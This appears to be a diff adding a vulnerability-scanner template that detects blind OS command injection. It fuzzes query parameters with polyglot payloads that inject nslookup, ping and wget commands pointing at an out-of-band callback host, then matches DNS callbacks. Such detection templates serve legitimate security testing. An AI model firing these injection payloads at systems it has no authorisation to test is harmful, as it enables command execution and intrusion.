@@ -1,0 +1,51 @@
+id: cmdi-blind-oast-polyglot
+
+info:
+  name: Blind OS Command Injection
+  author: 4rt3f4kt
+  severity: high
+  description: |
+    Potential blind OS command injection vulnerabilities, where the application constructs OS commands using unsanitized user input.
+    Successful exploitation could lead to arbitrary command execution on the system.
+  reference:
+    - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+  tags: fuzzing-req,fuzzing-req-query
+
+variables:
+  marker: "{{interactsh-url}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+          - 'method == "OPTIONS"'
+        condition: or
+
+    payloads:
+      payload:
+        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
+        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+        - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
+        - '%24%7Brce%3D%22nslookup%20-type%3DSRV%20{{marker}}%22%3Brce.execute%28%29.text%7D'
+        
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{payload}}"
+
+    stop-at-first-match: false
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
